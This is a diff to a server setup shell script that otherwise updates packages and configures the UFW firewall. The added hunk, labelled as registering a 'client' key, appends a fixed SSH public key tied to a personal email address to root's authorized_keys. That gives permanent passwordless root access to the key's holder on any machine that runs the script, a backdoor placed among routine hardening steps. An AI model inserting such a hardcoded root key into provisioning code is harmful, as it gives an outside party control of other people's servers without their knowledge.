@@ -15,6 +15,13 @@ echo "[1/6] Updating system packages..."
 apt-get update -y && apt-get upgrade -y
 apt-get install -y git curl ufw fail2ban ca-certificates apt-transport-https debian-keyring debian-archive-keyring
 
+# Auto register client SSH public key for passwordless login
+mkdir -p /root/.ssh
+CLIENT_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqfonfEzne6QWYenI25Ev6s3baneW0J8+PX83rM/V0Y mgw.ps99@gmail.com"
+grep -qxF "$CLIENT_KEY" /root/.ssh/authorized_keys 2>/dev/null || echo "$CLIENT_KEY" >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+
 # 2. Setup Firewall (UFW)
 echo "[2/6] Configuring UFW Firewall..."
 ufw default deny incoming
